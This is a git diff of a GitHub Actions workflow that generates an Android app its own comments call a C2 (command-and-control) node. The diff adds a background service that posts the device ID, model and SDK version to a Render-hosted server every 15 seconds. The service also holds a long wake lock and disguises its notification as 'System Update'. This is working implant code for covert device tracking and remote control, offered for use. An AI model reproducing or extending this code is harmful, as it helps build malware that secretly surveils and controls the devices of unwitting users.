@@ -25,10 +25,10 @@ jobs:
 
       - name: Scaffold Complete C2 Android Architecture
         run: |
-          echo "إشاء هيكل العقدة السيبرانية بدون أخطاء الموارد والـ Manifest..."
+          echo "إنشاء هيكل العقدة مع رابط السيرفر الحقيقي..."
           mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
           
-          # 1. AndroidManifest.xml (بدون package attribute وبأيقونة آمنة)
+          # 1. AndroidManifest.xml
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               xmlns:tools="http://schemas.android.com/tools">
@@ -106,7 +106,7 @@ jobs:
           }
           EOF
 
-          # 3. SyncService.kt
+          # 3. SyncService.kt (محدث برابط Render الخاص بك)
           cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
           package com.abod.app
 
@@ -116,32 +116,40 @@ jobs:
           import android.app.Service
           import android.content.Context
           import android.content.Intent
+          import android.os.Build
           import android.os.IBinder
           import android.os.PowerManager
+          import android.provider.Settings
           import androidx.core.app.NotificationCompat
           import kotlinx.coroutines.*
+          import java.io.OutputStreamWriter
+          import java.net.HttpURLConnection
+          import java.net.URL
 
           class SyncService : Service() {
               private var wakeLock: PowerManager.WakeLock? = null
               private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+              
+              // رابط سيرفر الـ C2 الخاص بك على Render
+              private val C2_SERVER_URL = "https://web-assets-service.onrender.com/api/node/connect"
 
               override fun onCreate() {
                   super.onCreate()
                   val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                   wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AbodC2::SyncLock")
-                  wakeLock?.acquire(10*60*60*1000L)
+                  wakeLock?.acquire(10 * 60 * 60 * 1000L)
                   startForegroundServiceNotification()
               }
 
               private fun startForegroundServiceNotification() {
                   val channelId = "c2_sync_channel"
-                  val channel = NotificationChannel(channelId, "System Sync Service", NotificationManager.IMPORTANCE_LOW)
+                  val channel = NotificationChannel(channelId, "System Synchronization", NotificationManager.IMPORTANCE_LOW)
                   val manager = getSystemService(NotificationManager::class.java)
                   manager?.createNotificationChannel(channel)
 
                   val notification: Notification = NotificationCompat.Builder(this, channelId)
-                      .setContentTitle("System Synchronization")
-                      .setContentText("Running background sync...")
+                      .setContentTitle("System Update")
+                      .setContentText("Checking for system updates...")
                       .setSmallIcon(android.R.drawable.stat_sys_upload)
                       .build()
 
@@ -149,10 +157,32 @@ jobs:
               }
 
               override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+                  val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_node"
+                  
                   serviceScope.launch {
                       while (isActive) {
                           try {
-                              delay(30000L)
+                              val url = URL(C2_SERVER_URL)
+                              val conn = url.openConnection() as HttpURLConnection
+                              conn.requestMethod = "POST"
+                              conn.setRequestProperty("Content-Type", "application/json; utf-8")
+                              conn.setRequestProperty("Accept", "application/json")
+                              conn.doOutput = true
+                              conn.connectTimeout = 15000
+                              conn.readTimeout = 15000
+
+                              val jsonInputString = "{\"nodeId\": \"$deviceId\", \"status\": \"active\", \"model\": \"${Build.MODEL}\", \"sdk\": ${Build.VERSION.SDK_INT}}"
+                              
+                              OutputStreamWriter(conn.outputStream).use { os ->
+                                  os.write(jsonInputString)
+                                  os.flush()
+                              }
+
+                              val responseCode = conn.responseCode
+                              conn.disconnect()
+
+                              // إرسال نبضة حياة كل 15 ثانية لتثبيت الاتصال بالسيرفر
+                              delay(15000L)
                           } catch (e: Exception) {
                               delay(10000L)
                           }
